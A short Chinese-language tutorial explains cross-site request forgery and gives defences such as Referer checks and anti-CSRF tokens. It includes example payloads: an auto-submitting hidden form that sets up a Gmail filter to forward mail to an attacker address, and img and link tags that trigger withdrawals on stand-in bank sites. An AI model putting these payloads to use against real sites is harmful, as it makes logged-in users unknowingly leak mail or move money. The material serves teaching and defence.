# CSRF 跨站请求伪造

跨站请求伪造(Cross-site request forgery)，通常缩写为SCRF或XSRF，是一种挟制用户在当前已登录的Web应用程序上执行非本意的攻击方式，跟跨站脚本(XSS)相比，XSS利用的是用户对指定网站的信任，CSRF利用的是网站对用户网页浏览器的信任。

这利用了web中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的
eg:
- 隐藏的表单：
```html
<form method="POST" action="https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf" enctype="multipart/form-data">
    <input type="hidden" name="cf2_emc" value="true"/>
    <input type="hidden" name="cf2_email" value="hacker@hakermail.com"/>
    .....
    <input type="hidden" name="irf" value="on"/>
    <input type="hidden" name="nvp_bu_cftb" value="Create Filter"/>
</form>
<script>
    document.forms[0].submit();
</script>
```
- img标签：
```html
<img src="http://bank.example/withdraw?amount=10000&for=hacker" >
```
- a标签链接
```html
<a href="http://test.com/csrf/withdraw.php?amount=1000&for=hacker" taget="_blank">
  重磅消息！！
<a/>
```

## 防御措施
### 检查Referer字段
HTTP请求头中的referer字段标明请求来源于哪个地址，根据referer字段确认请求是否来自预期的安全网站，以识别恶意的访问。

### 添加校验token
由于CSRF的本质在于攻击者欺骗用户去访问自己设置的地址，所有如果要求在访问敏感数据请求时，要求用户提供不保存在cookie中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再运行CSRF攻击。

参考文献：
- [跨站请求伪造](https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)
- [前端安全系列(2)：如何防止CSRF攻击](https://segmentfault.com/a/1190000016659945)
